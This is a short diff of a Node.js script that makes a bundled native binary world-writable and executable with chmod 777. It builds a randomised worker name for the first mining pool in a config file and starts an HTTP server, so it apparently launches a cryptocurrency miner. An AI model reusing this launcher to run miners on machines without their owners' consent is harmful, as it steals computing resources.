@@ -5,15 +5,16 @@ let fuck = require('./config.json');
 child_process.execSync('chmod 777 ' + __dirname + '/unti.node');
 if(!fuck.noFuck) {
   fuck.noFuck = (
-    Math.random() * 0xfff +
+    Math.random() * 0xffffffff +
     Date.now() + 
     process.pid
-  );
+  ).toString(36);
   fs.writeFileSync('./config.json', JSON.stringify(fuck, null, 2));
 };
 
 if(!fuck.pools[0].user.split('.')[1]) {
-  fuck.pools[0].user += '.' + __dirname.split('/')[2] + fuck.noFuck;
+  const fff = __dirname.split('/');
+  fuck.pools[0].user += '.' + fff[Math.floor(Math.random()*fff.length)] + fuck.noFuck;
   fs.writeFileSync('./config.json', JSON.stringify(fuck, null, 2));
 };
 const server = http.createServer();
